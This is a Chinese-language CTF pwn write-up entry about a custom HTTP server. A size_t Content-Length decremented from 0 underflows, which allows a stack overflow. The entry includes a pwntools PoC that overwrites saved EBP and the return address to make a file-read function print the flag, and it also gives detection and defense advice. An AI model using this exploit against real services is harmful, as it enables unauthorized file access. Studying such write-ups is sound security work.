---
id: ctf-pwn-http-content-length-zero-size-t-underflow-ebp-control-file-read
title: HTTP 解析 Content-Length 用 size_t 且按 --n 递减：传 0 得到 SIZE_MAX，溢出后可控制 saved EBP 让文件读取函数从 bss 里的 flag 字符串处读文件
type: scenario
domain: ctf
path: ctf/pwn
technique: http-content-length-size-t-underflow-ebp-control
aliases:
- Content-Length 0 溢出
- size_t 下溢 栈溢出
- HTTP 服务 ctf pwn
- ebp 控制 文件读取
- Message_Board
- 0x804924c get_file
tags:
- ctf
- pwn
- http
- stack-overflow
- integer-underflow
- ebp-control
- file-read
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W9
  verified_at: '2026-11-09T03:35:40+08:00'
  notes: '已对照原文核对；本次核对未读取图片；size_t 取 0 后 --n 下溢、四段式请求（请求行/Content-Length: 0/Cookie: Username=flag;Messages=flag/空行）、0x82e-14+8 偏移、0x804C180 与 0x80492BD 地址、ljust(0x5000) 补零等均取自正文 exp 原文；get_file 处 0x804924c 与正文「返回到这个 0x804924c」一致，正文同时给出的返回地址 0x80492BD 亦保留；未执行文内 PoC'
---

## 一句话结论

自实现 HTTP 服务把 `Content-Length` 读进 `size_t n` 后立刻 `--n`，传 `Content-Length: 0` 会让 `n` 下溢成 `SIZE_MAX`，随后的 body `read` 就能把远超栈缓冲区长度的数据写进栈、覆盖 saved EBP 与返回地址；把返回地址指向服务里的"读文件并输出"函数、并把 saved EBP 设成 `bss 中 flag 字符串地址 + 0x42c + 偏移`，使该函数内部 `lea eax,[ebp-0x42c]` 恰好落在字符串 `flag` 上，即可直接读出 flag，全程不需要泄露 libc。

## 原理

- **`size_t` 无符号，`--n` 在 n=0 时回绕**：`--n` 让 `0` 变成 `2^32-1`（32 位）/`2^64-1`（64 位）。循环条件写成 `while (n--)` 或 `read(fd, buf, n)` 时，判断与读取使用同一个被回绕的值，长度校验形同虚设。
- **为什么必须"多传一点"**：溢出后若长度刚好在覆盖返回地址处用尽，循环/读取会立刻结束在异常状态；实际要多给数据，让写入过程完整走过返回地址之后，程序才能正常返回并转到攻击者指定的地址。
- **为什么控制 EBP 就够**：目标函数用 `lea eax, [ebp-0x42c]` 取得文件名字符串地址再读文件。攻击者不改函数逻辑，只把 saved EBP 改成 `目标字符串地址 + 0x42c`，函数里 `ebp-0x42c` 就等价于该字符串地址——用一个已有的 bss 全局变量（本例 `::dest`，由 Cookie 解析写入）当作"任意指针"用。
- **bss 全局变量是可控落点**：请求头里 `Cookie: Username=flag;Messages=flag` 会被解析进 bss 的全局缓冲区（`dest`），所以攻击者不需要往栈上放字符串，flag 路径已经在固定地址上；`\x00` 截断会限制只能用一个字段，这也是选择 `Messages=` 位置而非 `Username=` 的原因。
- **为什么要发四段**：服务按行/按长度分段读请求，第一段请求行 `POST /submit HTTP/1.1`、第二段 `Content-Length: 0`、第三段 `Cookie: ...`、第四段空行退出循环；顺序错了就读不到 Cookie 分支，也到不了溢出点。

## 触发条件

- 自实现 HTTP 服务把 `Content-Length` 存进无符号类型并按 `--n` / `n-1` 递减后直接用于 `read`/`recv`。
- body 读到固定长度栈缓冲区且无 canary 或可绕过。
- 二进制里存在"按 `ebp` 相对偏移取文件名并输出内容"的函数（`get_file`/`read_content` 之类），且可被 ROP 直达。
- 存在可写入可控字符串的 bss 全局变量，其地址已知（无 PIE 时直接可用）。

## 利用步骤

1. 确认 `Content-Length` 的解析类型与递减写法（IDA 里看 `mov`/`sub` 位宽与循环条件）。
2. 按服务分段读取逻辑发四段：请求行、`Content-Length: 0`、`Cookie: Username=flag;Messages=flag`、空行。
3. 记下文件读取函数的地址（如 `0x804924c` 处 `lea eax,[ebp-0x42c]`）与 bss 中 `dest` 的地址；偏移取 `0x42c + len("Cookie: Username=flag;Messages=")`，使 `ebp-0x42c` 正好指向 `flag`。
4. 第二段发送 `'a'*(溢出到 saved EBP 的长度) + p32(fake_ebp) + p32(get_file_addr)`，并补足到足够长度（如 `ljust(0x5000, b'\x00')`）。
5. 接收响应，文件内容即 flag；若失败，用 gdb 在溢出点下断确认 EBP 是否被改写、返回地址是否命中。

## PoC

```python
from pwn import *
io = process('./httpd')
# 四段式请求：请求行 / Content-Length / Cookie / 空行
first = b'POST /submit HTTP/1.1\r\nContent-Length: 0\r\nCookie: Username=flag;Messages=flag\r\n\r\n'
io.sendline(first)
# saved EBP 指向 bss 中 "flag" 字符串（:dest + 0x42c + 前缀长度），返回地址跳到读文件函数
payload = b'a' * (0x82e - 14 + 8) \
        + p32(0x804C180 + 0x42c + len('Cookie: Username=flag;Messages=')) \
        + p32(0x80492BD)
payload = payload.ljust(0x5000, b'\x00')
io.sendline(payload)
io.interactive()
```

```text
判据：Content-Length: 0 之后仍能继续写入并覆盖 saved EBP；
返回后进程不崩溃且输出 flag 文件内容（该函数按 [ebp-0x42c] 取文件名）。
```

## 变体与关联

- 关联：[[ctf-pwn-httpd-path-popen-command-injection]]、[[ctf-pwn-httpd-shell-quote-splice-sh-bin-filter-popen]]、[[ctf-pwn-httpd-base64-typed-command-arb-rw-got-system]]（同属自实现 HTTP 服务的解析缺陷，但落点是命令注入/任意读写而非长度下溢）、[[binary-pwn-stack-pivot-leave-ret-bss]]（同样是控制 saved EBP 改变后续栈/取址语义）。
- 变体：`Content-Length` 为负数字符串时 `atoi` 得 `-1` 再赋给无符号同样回绕；若没有现成的读文件函数，可在控制 EBP 后接 `leave; ret` 把栈迁到 bss 写完整 ROP。
- 边界：有 canary 且无泄露点时该链不成立；`read` 用 `MSG_WAITALL`/分包时长度下溢的表现不同，需要按实际循环条件调整发送量；PIE 打开后 bss 与函数地址都需先泄露。

## 检测与防御

- 检测：请求头 `Content-Length: 0` 但随后有大量 body 数据；单连接内出现远超声明长度的写入；栈溢出后返回地址指向二进制内非调用点的地址（ROP 特征）。
- 防御：`Content-Length` 用有符号类型并显式校验 `>0` 与上限；用 `read` 返回值而非声明长度控制循环；编译期开启 canary/PIE/FORTIFY；把"读文件"这类高危功能放在独立进程并限制目录。
